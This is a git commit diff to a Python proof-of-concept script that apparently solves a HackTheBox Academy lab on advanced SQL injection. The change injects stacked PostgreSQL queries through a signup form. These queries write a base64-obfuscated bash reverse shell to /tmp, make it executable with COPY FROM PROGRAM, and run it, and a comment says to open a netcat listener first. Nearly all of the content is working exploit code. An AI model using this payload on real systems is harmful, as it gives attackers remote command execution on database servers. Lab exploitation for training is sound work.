2dafea460bd956cc3a6f1e3bff182b9ac701b967
Adam Rose <93153300+AdamRose1@users.noreply.github.com>
2025-01-27 13:56:48 -0500

    Update Advanced_SQL_Injections-Reading_and_Writing_Files.py

--- HackTheBox-Writeups/HTBAcademy: POC-Scripts/Advanced_SQL_Injections-Reading_and_Writing_Files.py
+++ HackTheBox-Writeups/HTBAcademy: POC-Scripts/Advanced_SQL_Injections-Reading_and_Writing_Files.py
@@ -3,6 +3,8 @@
 """Created this script to solve the HackTheBox Academy lab called 'Reading and Writing Files' for the module called 'Advanced SQL Injections'. 
 This script exploits a blind postgreSQL injection to get RCE"""
 
+# The base64 string below is base64 of the following reverse shell command: bash -c "bash -i  >& /dev/tcp/127.0.0.1/4444 0>&1".  Open a netcat listener before running the script.
+
 import random
 import string
 import requests
@@ -18,6 +20,6 @@ def generate_random_word():
 
 random_group = generate_random_word()
 
-data= f"name={random_group}&username={random_group}','{random_group}@test.com','afda');create+table+{random_group}(mycol+text);Insert into {random_group} values ('test');COPY {random_group} TO '/var/lib/postgresql/proof.txt ';COPY {random_group} FROM PROGRAM 'sh /opt/bluebird/serverInfo.sh';copy {random_group} to '/tmp/final.txt'--+-&email={random_group}%40a.com&password=test&repeatPassword=test"
+data= f"name={random_group}&username={random_group}','{random_group}@test.com','afda');create+table+{random_group}(mycol+text);Insert into {random_group} values ($$echo -n YmFzaCAtYyAiYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTI3LjAuMC4xLzQ0NDQgMD4mMSI=|base64 -d|bash$$);COPY {random_group} TO '/var/lib/postgresql/proof.txt ';COPY {random_group} TO '/tmp/atest.sh';copy {random_group} FROM program 'chmod 777 /tmp/atest.sh';copy {random_group} TO program '/tmp/atest.sh'--+-&email={random_group}%40a.com&password=test&repeatPassword=test"
 
 response= requests.post(url= f"http://{target}/signup", proxies=proxies, headers=headers, verify=False, allow_redirects=True, data=data)
